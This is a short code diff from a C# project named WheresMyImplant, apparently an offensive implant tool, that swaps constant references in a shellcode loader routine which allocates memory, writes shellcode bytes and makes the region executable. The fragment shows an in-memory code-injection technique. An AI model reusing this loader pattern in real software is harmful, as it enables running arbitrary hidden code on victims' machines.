@@ -23,7 +23,7 @@ namespace WheresMyImplant
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpAddress = IntPtr.Zero;
             UInt32 dwSize = (UInt32)shellCodeBytes.Length;
-            IntPtr lpBaseAddress = Unmanaged.VirtualAlloc(lpAddress, dwSize, Unmanaged.MEM_COMMIT, Unmanaged.PAGE_READWRITE);
+            IntPtr lpBaseAddress = Unmanaged.VirtualAlloc(lpAddress, dwSize, Unmanaged.MEM_COMMIT, Winnt.PAGE_READWRITE);
             WriteOutput("Allocating Space at Address " + lpBaseAddress);
             WriteOutput("Memory Protection Set to PAGE_READWRITE");
 
@@ -33,7 +33,7 @@ namespace WheresMyImplant
 
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 lpflOldProtect = 0;
-            Boolean test = Unmanaged.VirtualProtect(lpBaseAddress, dwSize, Unmanaged.PAGE_EXECUTE_READ, ref lpflOldProtect);
+            Boolean test = Unmanaged.VirtualProtect(lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
             WriteOutput("Altering Memory Protections to PAGE_EXECUTE_READ");
 
             ////////////////////////////////////////////////////////////////////////////////
